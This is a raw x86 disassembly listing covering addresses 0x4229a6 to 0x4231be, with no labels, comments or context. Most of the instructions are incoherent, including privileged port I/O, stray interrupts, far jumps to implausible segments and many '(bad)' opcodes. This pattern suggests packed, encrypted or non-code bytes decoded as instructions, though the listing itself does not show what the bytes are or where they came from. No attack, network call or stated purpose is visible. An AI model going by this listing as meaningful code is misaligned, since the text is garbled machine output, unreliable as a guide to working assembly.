  4229a6:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  4229ad:	jo     0x422a1f
  4229af:	jo     0x422a21
  4229b1:	jo     0x42294d
  4229b3:	xor    esi,edi
  4229b5:	cwde   
  4229b6:	add    al,0xc
  4229b8:	add    BYTE PTR [ebp-0x80],bl
  4229bb:	xchg   DWORD PTR [eax-0x30522a80],eax
  4229c1:	or     DWORD PTR [eax-0x75],ebx
  4229c4:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  4229cb:	jecxz  0x4229b8
  4229cd:	hlt    
  4229ce:	scas   eax,DWORD PTR es:[edi]
  4229cf:	rol    BYTE PTR [ebp-0x6def4262],0x80
  4229d6:	sub    dl,0xfa
  4229d9:	iret   
  4229da:	pop    eax
  4229db:	iret   
  4229dc:	push   0xffffffcd
  4229de:	out    0xfd,al
  4229e0:	int    0x76
  4229e2:	adc    DWORD PTR [ebx],esi
  4229e4:	out    0x34,al
  4229e6:	sub    ecx,ecx
  4229e8:	or     dh,BYTE PTR [esi-0x43]
  4229eb:	rol    BYTE PTR [eax-0x7f6d1243],1
  4229f1:	sub    BYTE PTR [edi],0x6
  4229f4:	sub    DWORD PTR [eax-0x72357f80],eax
  4229fa:	cmc    
  4229fb:	sub    esp,esi
  4229fd:	in     eax,dx
  4229fe:	aad    0xe9
  422a00:	add    ebx,ebp
  422a02:	mov    bh,dh
  422a04:	fcmovnbe st,st(5)
  422a06:	out    dx,eax
  422a07:	pushf  
  422a08:	xchg   edi,edi
  422a0a:	test   al,0xcf
  422a0c:	fs adc ebx,0xffffffe9
  422a10:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a14:	iret   
  422a15:	int3   
  422a16:	call   0x80c278df
  422a1b:	jno    0x4229b5
  422a1d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422a27:	int    0xe6
  422a29:	std    
  422a2a:	xor    esp,esi
  422a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2d:	das    
  422a2e:	pop    ecx
  422a2f:	push   0xffffffcd
  422a31:	(bad)  
  422a32:	or     eax,0xfcde9e3
  422a37:	sub    edi,eax
  422a39:	xchg   DWORD PTR [edi],ecx
  422a3b:	iret   
  422a3c:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422a42:	add    BYTE PTR [eax-0x102c8233],0x88
  422a49:	add    al,0xf2
  422a4b:	add    DWORD PTR [ebx+0x2],0x80818069
  422a52:	adc    dh,0x4e
  422a55:	inc    ebx
  422a56:	jns    0x4229da
  422a58:	fldlg2 
  422a5a:	es int 0xc6
  422a5d:	or     eax,0x809221bd
  422a62:	add    al,0x81
  422a65:	mov    al,ds:0xfb87d287
  422a6a:	add    al,0xbd
  422a6c:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422a73:	jns    0x422a42
  422a75:	ins    DWORD PTR es:[edi],dx
  422a76:	and    ch,0xa0
  422a79:	push   edx
  422a7a:	add    al,0x3
  422a7c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422a82:	push   edx
  422a83:	add    al,0x3
  422a85:	push   ebx
  422a86:	mov    al,cl
  422a88:	test   bh,bh
  422a8a:	retf   
  422a8b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422a93:	(bad)  
  422a94:	in     al,dx
  422a95:	outs   dx,DWORD PTR ds:[esi]
  422a96:	rcl    bl,1
  422a98:	(bad)  
  422a99:	jge    0x422a58
  422a9b:	outs   dx,DWORD PTR ds:[esi]
  422a9c:	xchg   edx,eax
  422a9d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422aa4:	sahf   
  422aa5:	mov    al,ds:0x3454009e
  422aaa:	jno    0x422b0e
  422aac:	popa   
  422aad:	mov    ah,0x86
  422aaf:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422ab6:	push   cs
  422ab7:	(bad)  
  422ab8:	jge    0x422a77
  422aba:	push   eax
  422abb:	xchg   edx,eax
  422abc:	add    BYTE PTR [eax+0x2d048d6],0xff
  422ac3:	jge    0x422a82
  422ac5:	push   ss
  422ac6:	xchg   edx,eax
  422ac7:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422ace:	ror    BYTE PTR [ecx+0x53d09282],1
  422ad4:	jo     0x422aa3
  422ad6:	(bad)  
  422ad7:	std    
  422ad8:	xor    edx,esi
  422ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422adb:	inc    ebx
  422adc:	(bad)  
  422add:	xor    al,0x2f
  422adf:	or     esp,ebx
  422ae1:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422aeb:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422af5:	int    0xd6
  422af7:	popf   
  422af8:	aam    0x23
  422afa:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b00:	or     ch,0xd6
  422b03:	xchg   ebp,eax
  422b04:	aam    0x89
  422b06:	int    0xd6
  422b08:	icebp  
  422b09:	int    0x8d
  422b0b:	xchg   ebp,eax
  422b0c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b12:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b18:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b1e:	pushf  
  422b1f:	stos   BYTE PTR es:[edi],al
  422b20:	sahf   
  422b21:	popa   
  422b22:	mov    esp,0xc180804a
  422b27:	mov    BYTE PTR [edi+0x649a62d9],al
  422b2d:	mov    ecx,edx
  422b2f:	rol    DWORD PTR [edx+0x70878492],cl
  422b35:	int    0xc6
  422b37:	or     eax,0x808169bd
  422b3c:	adc    dh,0x14
  422b3f:	int    0x76
  422b41:	mov    ebp,0xd30de6cd
  422b46:	lods   eax,DWORD PTR ds:[esi]
  422b47:	xchg   DWORD PTR [ebx],esi
  422b49:	retf   
  422b4a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b51:	in     al,dx
  422b52:	push   esi
  422b53:	int    0xc6
  422b55:	or     eax,0xbd92c704
  422b5a:	daa    
  422b5b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b65:	or     eax,0xc087add3
  422b6a:	mov    BYTE PTR [esi-0x30577740],bl
  422b70:	gs jp  0x422af7
  422b73:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422b7d:	xchg   esi,esp
  422b7f:	or     eax,0x699e30c0
  422b84:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422b8b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422b8e:	int    0x10
  422b90:	mov    ebp,0x808081bc
  422b95:	int    0x7d
  422b97:	xor    ecx,DWORD PTR [edi]
  422b99:	xor    ah,0x81
  422b9c:	lea    esi,[ebp-0x7b8a19fc]
  422ba2:	das    
  422ba3:	add    al,0xd0
  422ba5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bac:	int    0x8d
  422bae:	mov    ch,0x4
  422bb0:	cli    
  422bb1:	test   BYTE PTR [edx-0x61783f79],al
  422bb7:	int    0xe6
  422bb9:	jge    0x422b8e
  422bbb:	xacquire xchg BYTE PTR [ebx],dh
  422bbe:	ins    DWORD PTR es:[edi],dx
  422bbf:	ins    BYTE PTR es:[edi],dx
  422bc0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422bc5:	outs   dx,DWORD PTR ds:[esi]
  422bc6:	lods   al,BYTE PTR ds:[esi]
  422bc7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bcd:	inc    esp
  422bce:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422bd8:	lea    edi,[ebp+0x4a58d0a]
  422bde:	cli    
  422bdf:	test   BYTE PTR [edx+0x402cd77],al
  422be5:	mov    dh,0xa5
  422be7:	and    ebx,0xa58d04ef
  422bed:	xchg   edx,eax
  422bee:	mov    es,WORD PTR [edx+edi*8]
  422bf1:	dec    esi
  422bf2:	ja     0x422c12
  422bf4:	pop    ebp
  422bf5:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422bfb:	int    0xf
  422bfd:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c03:	jecxz  0x422bb2
  422c05:	xchg   DWORD PTR [esi+0x7d],esi
  422c08:	or     dh,BYTE PTR [esi+0xd]
  422c0b:	in     al,dx
  422c0c:	inc    esi
  422c0d:	add    al,0xef
  422c0f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c15:	jecxz  0x422c03
  422c17:	jecxz  0x422bcf
  422c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c1a:	pop    esi
  422c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c1c:	lods   eax,DWORD PTR ds:[esi]
  422c1d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c24:	lods   eax,DWORD PTR ds:[esi]
  422c25:	mov    ss,esi
  422c27:	mov    ebp,0x8086745d
  422c2c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c33:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c39:	test   al,0x33
  422c3b:	add    BYTE PTR [edx-0x33],bh
  422c3e:	leave  
  422c3f:	int    0xc6
  422c41:	or     eax,0x808059bd
  422c46:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4e:	jecxz  0x422c39
  422c50:	mov    ss,esi
  422c52:	in     eax,dx
  422c53:	in     al,dx
  422c54:	add    BYTE PTR [eax],0x76
  422c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c58:	int    0x8d
  422c5a:	mov    ch,0x4
  422c5c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c62:	leave  
  422c63:	xor    esi,DWORD PTR [esi+0x34]
  422c66:	pop    esi
  422c67:	jbe    0x422c0e
  422c69:	jnp    0x422bf5
  422c6b:	int    0xf8
  422c6d:	xor    edx,esi
  422c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c70:	int    0x96
  422c72:	cmp    al,0x45
  422c74:	inc    ecx
  422c75:	inc    ebx
  422c76:	add    esi,DWORD PTR [edi-0x79]
  422c79:	jle    0x422c51
  422c7b:	clc    
  422c7c:	or     ah,dh
  422c7e:	std    
  422c7f:	das    
  422c80:	pop    ecx
  422c81:	adc    DWORD PTR [ebx-0x1a],eax
  422c84:	cmp    al,0x2f
  422c86:	or     esp,DWORD PTR [edx-0x2]
  422c89:	add    BYTE PTR [eax],al
  422c8b:	mov    ebp,0x80808040
  422c90:	xor    ebp,DWORD PTR [ebp-0x31]
  422c93:	les    esi,FWORD PTR [esp+eiz*2]
  422c96:	int    0x96
  422c98:	sub    al,0xcd
  422c9a:	(bad)  
  422c9b:	stc    
  422c9c:	xor    edx,esi
  422c9e:	sbb    al,0xa
  422ca0:	inc    edx
  422ca1:	int    0x96
  422ca3:	inc    esp
  422ca4:	int    0xe6
  422ca6:	std    
  422ca7:	xor    esp,esi
  422ca9:	xor    al,0xa
  422cab:	pusha  
  422cac:	retf   
  422cad:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cb3:	test   al,0x9c
  422cb5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cb8:	in     al,dx
  422cb9:	popf   
  422cba:	adc    bh,ah
  422cbc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422cc3:	shl    ebp,cl
  422cc5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422ccb:	(bad)  
  422ccc:	and    al,0x77
  422cce:	mov    ch,0xcd
  422cd0:	jbe    0x422c7f
  422cd2:	shr    DWORD PTR [ebp+0x760a4588],cl
  422cd8:	lods   eax,DWORD PTR ds:[esi]
  422cd9:	or     dl,dh
  422cdb:	stc    
  422cdc:	test   al,0xc5
  422cde:	int    0x8d
  422ce0:	jne    0x422d11
  422ce2:	pop    ecx
  422ce3:	ins    DWORD PTR es:[edi],dx
  422ce4:	shl    edx,cl
  422ce6:	test   BYTE PTR [edi-0x2c78428a],al
  422cec:	in     al,dx
  422ced:	xchg   BYTE PTR [edi],ch
  422cef:	pop    ecx
  422cf0:	ins    DWORD PTR es:[edi],dx
  422cf1:	xchg   DWORD PTR [esi+0x75],esi
  422cf4:	int    0xc6
  422cf6:	jge    0x422cc7
  422cf8:	les    esi,FWORD PTR [esi-0x80]
  422cfb:	xor    ebp,DWORD PTR [ebp-0x31]
  422cfe:	les    esi,FWORD PTR [esi-0x80]
  422d01:	adc    bh,ah
  422d03:	add    BYTE PTR [eax+0x24778180],0xcd
  422d0a:	mov    WORD PTR [esp+ebx*2],?
  422d0d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d14:	xor    al,0xa4
  422d16:	ja     0x422d3d
  422d18:	retf   0x31
  422d1b:	je     0x422d51
  422d1d:	pop    esp
  422d1e:	shl    ebp,cl
  422d20:	mov    BYTE PTR [ecx],cl
  422d22:	xchg   esp,eax
  422d23:	xor    al,0x2c
  422d25:	int    0xc
  422d27:	das    
  422d28:	mov    ebx,0xebd38096
  422d2d:	push   ebx
  422d2e:	das    
  422d2f:	rcl    DWORD PTR [ebx],1
  422d31:	pop    esi
  422d32:	mov    WORD PTR [esp+ebp*1],?
  422d35:	ja     0x422d51
  422d37:	int    0xdb
  422d39:	pop    edi
  422d3a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d41:	jmp    0x422cc8
  422d43:	mov    eax,0x87808d81
  422d48:	ins    DWORD PTR es:[edi],dx
  422d49:	iret   
  422d4a:	les    esi,FWORD PTR [esp+ebp*2]
  422d4d:	(bad)
  422d50:	test   DWORD PTR [esi],edi
  422d52:	mov    WORD PTR [esp+ebp*1],?
  422d55:	xor    ebx,ebx
  422d57:	mov    eax,0x8780963e
  422d5c:	ins    DWORD PTR es:[edi],dx
  422d5d:	add    al,0x6d
  422d5f:	or     edi,0xc56c34c4
  422d65:	cwde   
  422d66:	int    0xf0
  422d68:	mov    ebp,0xfcd9
  422d6d:	int    0xd9
  422d6f:	int    0xf
  422d71:	jns    0x422cf9
  422d73:	mov    bh,0xbd
  422d75:	sub    esp,edi
  422d77:	add    BYTE PTR [eax],al
  422d79:	cwde   
  422d7a:	int    0xf0
  422d7c:	jns    0x422df6
  422d7e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422d84:	add    BYTE PTR [eax-0x58798787],bl
  422d8a:	mov    ebp,0xfc38
  422d8f:	jns    0x422e09
  422d91:	xchg   edx,eax
  422d92:	cmp    eax,0xeceb99cd
  422d97:	add    eax,DWORD PTR [eax]
  422d99:	add    BYTE PTR [esi-0x12ed1233],dl
  422d9f:	inc    esp
  422da0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422daa:	leave  
  422dab:	jbe    0x422d62
  422dad:	inc    ecx
  422dae:	and    DWORD PTR [esi-0x778932cb],eax
  422db4:	or     dh,BYTE PTR [esi-0x78]
  422db7:	int    0x76
  422db9:	stc    
  422dba:	int    0x96
  422dbc:	stc    
  422dbd:	pop    ebx
  422dbe:	cwde   
  422dbf:	call   0xd3e3:0x3b9effc0
  422dc6:	jmp    0x3586:0x21d1bf28
  422dcd:	cmp    eax,ebp
  422dcf:	sar    DWORD PTR [ebp+0xad25392],cl
  422dd5:	jbe    0x422e4c
  422dd7:	int    0x76
  422dd9:	stc    
  422dda:	int    0x96
  422ddc:	stc    
  422ddd:	cmp    eax,ebp
  422ddf:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422de5:	jmp    0xfd76:0xad25328
  422dec:	int    0x76
  422dee:	stc    
  422def:	int    0x96
  422df1:	stc    
  422df2:	cmp    eax,ebp
  422df4:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422dfa:	jmp    0xd076:0xad25328
  422e01:	int    0x76
  422e03:	stc    
  422e04:	int    0x96
  422e06:	stc    
  422e07:	cmp    eax,ebp
  422e09:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e0f:	jmp    0xbd76:0xad25328
  422e16:	leave  
  422e17:	jbe    0x422e46
  422e19:	dec    ecx
  422e1a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e21:	mov    al,ds:0x76c93586
  422e26:	and    eax,0x35862169
  422e2b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e2f:	jbe    0x422e01
  422e31:	or     dh,BYTE PTR [esi-0x30]
  422e34:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e3c:	ror    cl,1
  422e3e:	jbe    0x422e10
  422e40:	jo     0x422dc2
  422e42:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e49:	add    BYTE PTR [eax-0x32068933],0x96
  422e50:	stc    
  422e51:	cmp    eax,ebp
  422e53:	cmp    esp,ebx
  422e55:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e5b:	push   ebx
  422e5c:	ror    BYTE PTR [edx],cl
  422e5e:	jbe    0x422e30
  422e60:	int    0x76
  422e62:	stc    
  422e63:	int    0x96
  422e65:	stc    
  422e66:	cmp    eax,ebp
  422e68:	cmp    esp,ebx
  422e6a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e70:	push   ebx
  422e71:	ror    BYTE PTR [edx],cl
  422e73:	jbe    0x422e45
  422e75:	leave  
  422e76:	jbe    0x422e0d
  422e78:	arpl   WORD PTR [edx+0x76c98080],dx
  422e7e:	lods   eax,DWORD PTR ds:[esi]
  422e7f:	pop    esi
  422e80:	add    BYTE PTR [eax+0xd76c980],0xe6
  422e87:	add    BYTE PTR [eax-0xa983080],0xff
  422e8e:	add    BYTE PTR [eax],al
  422e90:	iret   
  422e91:	push   edi
  422e92:	xchg   ebp,eax
  422e93:	inc    DWORD PTR [eax]
  422e95:	add    BYTE PTR [ebp+0xff13],bh
  422e9b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ea1:	lea    ebp,[ebp-0x72ff562a]
  422ea7:	xchg   ebp,eax
  422ea8:	(bad)  
  422ea9:	fcmove st,st(1)
  422eab:	jbe    0x422e5a
  422ead:	dec    esi
  422eae:	ins    BYTE PTR es:[edi],dx
  422eaf:	add    BYTE PTR [eax-0x32068933],0x8d
  422eb6:	stc    
  422eb7:	cmp    eax,ebp
  422eb9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422ebf:	cmp    ecx,DWORD PTR [edi]
  422ec1:	shl    edx,cl
  422ec3:	sub    BYTE PTR [ebx-0x2d],dl
  422ec6:	or     dh,BYTE PTR [esi+0x6d]
  422ec9:	int    0x76
  422ecb:	stc    
  422ecc:	int    0x8d
  422ece:	stc    
  422ecf:	add    al,0xb6
  422ed1:	cmc    
  422ed2:	cmp    BYTE PTR [ebx],0xc5
  422ed5:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422edb:	repnz sub BYTE PTR [ebx-0x2d],dl
  422edf:	or     dh,BYTE PTR [esi-0x6b]
  422ee2:	mov    ah,0xb1
  422ee4:	sbb    al,0x80
  422ee6:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422eed:	push   eax
  422eee:	or     dh,BYTE PTR [esi-0x13]
  422ef1:	int    0x6c
  422ef3:	dec    esp
  422ef4:	or     dh,BYTE PTR [esi+0x11]
  422ef7:	int    0x76
  422ef9:	mov    bh,cl
  422efb:	(bad)  
  422efc:	cmc    
  422efd:	or     cl,BYTE PTR [ecx]
  422eff:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f05:	mov    bh,cl
  422f07:	(bad)  
  422f08:	in     eax,dx
  422f09:	or     cl,BYTE PTR [ecx]
  422f0b:	push   ebp
  422f0c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f16:	lea    edx,[ecx]
  422f18:	or     cl,BYTE PTR [ecx]
  422f1a:	pop    ebp
  422f1b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f25:	stc    
  422f26:	int    0x96
  422f28:	stc    
  422f29:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f2c:	cdq    
  422f2d:	shr    ebx,cl
  422f2f:	xchg   edx,eax
  422f30:	shr    edx,cl
  422f32:	sub    BYTE PTR [ebx+0x13],dl
  422f35:	inc    ebx
  422f36:	jge    0x422f67
  422f38:	add    eax,0x808087ca
  422f3d:	int    0x76
  422f3f:	mov    ch,cl
  422f41:	add    DWORD PTR ds:0xcd808081,esi
  422f47:	mov    ch,cl
  422f49:	jbe    0x422ed3
  422f4b:	int    0x1
  422f4d:	xor    eax,0xcd808081
  422f52:	add    BYTE PTR [edi-0x72329b92],0x88
  422f59:	int    0xa
  422f5b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f61:	adc    al,0x0
  422f63:	add    BYTE PTR [eax],al
  422f65:	(bad)  
  422f66:	int    0x96
  422f68:	mov    ch,cl
  422f6a:	mov    ds:0x80808125,al
  422f6f:	int    0x22
  422f71:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422f77:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422f7f:	bound  eax,QWORD PTR [eax]
  422f81:	jno    0x422fa7
  422f83:	cmp    ebp,DWORD PTR [ebp-0x37]
  422f86:	push   es
  422f87:	push   esp
  422f88:	add    BYTE PTR [eax],al
  422f8a:	add    BYTE PTR [esi],cl
  422f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8d:	aad    0x49
  422f8f:	leave  
  422f90:	push   es
  422f91:	pop    esp
  422f92:	add    BYTE PTR [eax],al
  422f94:	add    BYTE PTR [edi+0x35],dl
  422f97:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422f9d:	add    BYTE PTR [eax],al
  422f9f:	mov    ds:0x79d735c1,eax
  422fa4:	push   es
  422fa5:	ins    BYTE PTR es:[edi],dx
  422fa6:	add    BYTE PTR [eax],al
  422fa8:	add    BYTE PTR [eax],bl
  422faa:	iret   
  422fab:	outs   dx,BYTE PTR ds:[si]
  422fad:	add    BYTE PTR [eax],al
  422faf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fb5:	ins    DWORD PTR es:[edi],dx
  422fb6:	leave  
  422fb7:	push   es
  422fb8:	sub    al,0x0
  422fba:	add    BYTE PTR [eax],al
  422fbc:	push   cs
  422fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbe:	aad    0x49
  422fc0:	leave  
  422fc1:	push   es
  422fc2:	xor    al,0x0
  422fc4:	add    BYTE PTR [eax],al
  422fc6:	push   edi
  422fc7:	xor    eax,0x6c9ab13
  422fcc:	cmp    al,0x0
  422fce:	add    BYTE PTR [eax],al
  422fd0:	mov    ds:0x79c335c1,eax
  422fd5:	push   es
  422fd6:	inc    esp
  422fd7:	add    BYTE PTR [eax],al
  422fd9:	add    BYTE PTR [eax],bl
  422fdb:	iret   
  422fdc:	addr16 inc esi
  422fde:	add    BYTE PTR [eax],al
  422fe0:	add    BYTE PTR [edi-0x32be5048],ch
  422fe6:	jbe    0x422f70
  422fe8:	int    0x1
  422fea:	adc    DWORD PTR [ecx-0x19327f80],eax
  422ff0:	mov    BYTE PTR [ebp*2+0x35760a30],al
  422ff7:	int    0x76
  422ff9:	mov    ch,cl
  422ffb:	add    DWORD PTR [ebp-0x7f],edi
  422ffe:	add    BYTE PTR [eax+0x410176c9],0xa7
  423005:	mov    dl,0x35
  423007:	leave  
  423008:	jbe    0x42300f
  42300a:	mov    bh,0x3f
  42300c:	cmp    DWORD PTR [edi-0x48],eax
  42300f:	leave  
  423010:	jbe    0x42301b
  423012:	xlat   BYTE PTR ds:[ebx]
  423013:	sbb    cl,cl
  423015:	push   es
  423016:	les    eax,FWORD PTR [eax]
  423018:	add    BYTE PTR [eax],al
  42301a:	push   cs
  42301b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42301c:	aad    0x49
  42301e:	leave  
  42301f:	push   es
  423020:	nop
  423021:	add    BYTE PTR [eax],al
  423023:	add    BYTE PTR [edi+0x35],dl
  423026:	xlat   BYTE PTR ds:[ebx]
  423027:	inc    ecx
  423028:	leave  
  423029:	push   es
  42302a:	aam    0x0
  42302c:	add    BYTE PTR [eax],al
  42302e:	cmp    DWORD PTR [ecx+0x57],ecx
  423031:	jge    0x422ffc
  423033:	push   es
  423034:	fadd   QWORD PTR [eax]
  423036:	add    BYTE PTR [eax],al
  423038:	mov    cl,0x3f
  42303a:	shl    DWORD PTR ds:0xe406c9,0x0
  423041:	add    BYTE PTR [edi-0x49],al
  423044:	xlat   BYTE PTR ds:[ebx]
  423045:	sbb    cl,cl
  423047:	push   es
  423048:	pushf  
  423049:	add    BYTE PTR [eax],al
  42304b:	add    BYTE PTR [esi],cl
  42304d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304e:	aad    0x49
  423050:	leave  
  423051:	push   es
  423052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423053:	add    BYTE PTR [eax],al
  423055:	add    BYTE PTR [edi+0x35],dl
  423058:	xlat   BYTE PTR ds:[ebx]
  423059:	inc    ecx
  42305a:	leave  
  42305b:	push   es
  42305c:	lods   al,BYTE PTR ds:[esi]
  42305d:	add    BYTE PTR [eax],al
  42305f:	add    BYTE PTR [ecx],bh
  423061:	dec    ecx
  423062:	push   edi
  423063:	jge    0x42302e
  423065:	push   es
  423066:	mov    ah,0x0
  423068:	add    BYTE PTR [eax],al
  42306a:	mov    cl,0x3f
  42306c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423073:	add    BYTE PTR [edi-0x49],al
  423076:	ret    
  423077:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42307d:	jo     0x42304c
  42307f:	jbe    0x4230b6
  423081:	add    BYTE PTR [eax],dh
  423083:	int    0x76
  423085:	stc    
  423086:	int    0x8d
  423088:	stc    
  423089:	cmp    eax,ebp
  42308b:	cmp    ecx,DWORD PTR [edi]
  42308d:	shl    edx,cl
  42308f:	sub    bl,dl
  423091:	mov    ebp,0xcdd35392
  423096:	lea    ebp,[ebp+0x52fd343]
  42309c:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230a3:	int    0x8d
  4230a5:	mov    ch,0x3b
  4230a7:	lds    edi,FWORD PTR [ebx]
  4230a9:	psrlq  mm6,mm2
  4230ac:	sub    bl,dl
  4230ae:	mov    ebp,0xcdd35392
  4230b3:	lea    ebp,[ebp+0x76cd7d33]
  4230b9:	ins    DWORD PTR es:[edi],dx
  4230ba:	inc    ebx
  4230bb:	shr    DWORD PTR [edi],cl
  4230bd:	or     ch,dl
  4230bf:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230c9:	int    0x76
  4230cb:	mov    ch,cl
  4230cd:	rcl    BYTE PTR [ecx],1
  4230cf:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  4230d9:	add    DWORD PTR [ebp-0x7f],esi
  4230dc:	add    BYTE PTR [eax-0x7fc50943],0x80
  4230e3:	jo     0x4230e5
  4230e5:	cwde   
  4230e6:	xor    ch,cl
  4230e8:	lea    ecx,[eax-0x7ebaf533]
  4230ee:	add    BYTE PTR [eax+0x76cd810a],0x88
  4230f5:	int    0x5d
  4230f7:	adc    DWORD PTR [ecx-0x29327f80],eax
  4230fd:	mov    BYTE PTR [ebx],bh
  4230ff:	ins    DWORD PTR es:[edi],dx
  423100:	iret   
  423101:	pop    ss
  423102:	pushf  
  423103:	add    BYTE PTR [eax],al
  423105:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42310b:	jo     0x4230da
  42310d:	jbe    0x423097
  42310f:	int    0x1
  423111:	inc    ebp
  423112:	add    DWORD PTR [eax+0x500080],0x760a889a
  42311c:	adc    eax,0xcd8876cd
  423121:	pop    ebp
  423122:	adc    DWORD PTR [ecx-0x29327f80],eax
  423128:	mov    BYTE PTR [ebx],bh
  42312a:	ins    DWORD PTR es:[edi],dx
  42312b:	iret   
  42312c:	pop    ss
  42312d:	les    eax,FWORD PTR [eax]
  42312f:	add    BYTE PTR [eax],al
  423131:	mov    ebp,0x80803ad9
  423136:	jo     0x423105
  423138:	jbe    0x4230c2
  42313a:	int    0x1
  42313c:	inc    ebp
  42313d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423147:	mov    ch,cl
  423149:	pop    ebp
  42314a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423150:	mov    BYTE PTR [ebx],bh
  423152:	ins    DWORD PTR es:[edi],dx
  423153:	iret   
  423154:	pop    ss
  423155:	push   esp
  423156:	add    BYTE PTR [eax],al
  423158:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42315e:	jo     0x42312d
  423160:	jbe    0x4230ea
  423162:	int    0x1
  423164:	inc    ebp
  423165:	add    DWORD PTR [eax+0x500080],0xb604889a
  42316f:	pop    ebp
  423170:	or     BYTE PTR [edx],0x76
  423173:	xor    eax,0xc05d76cd
  423178:	push   ds
  423179:	cmp    ebx,edx
  42317b:	sahf   
  42317c:	clc    
  42317d:	add    al,BYTE PTR [ecx]
  42317f:	shr    BYTE PTR [esi+0x2f],cl
  423182:	pop    ecx
  423183:	shl    BYTE PTR [eax+0x0],cl
  423186:	xchg   esi,eax
  423187:	xor    eax,0x43d66d06
  42318c:	int    0x76
  42318e:	pop    ebp
  42318f:	add    al,0xad
  423191:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  423198:	adc    eax,0x40d46d06
  42319d:	int    0x76
  42319f:	mov    ch,cl
  4231a1:	pop    ebp
  4231a2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a8:	mov    BYTE PTR [ebx],bh
  4231aa:	ins    DWORD PTR es:[edi],dx
  4231ab:	iret   
  4231ac:	xchg   esi,eax
  4231ad:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231b3:	jo     0x423182
  4231b5:	jbe    0x42313f
  4231b7:	int    0x1
  4231b9:	cmp    eax,0x808081
  4231be:	push   eax
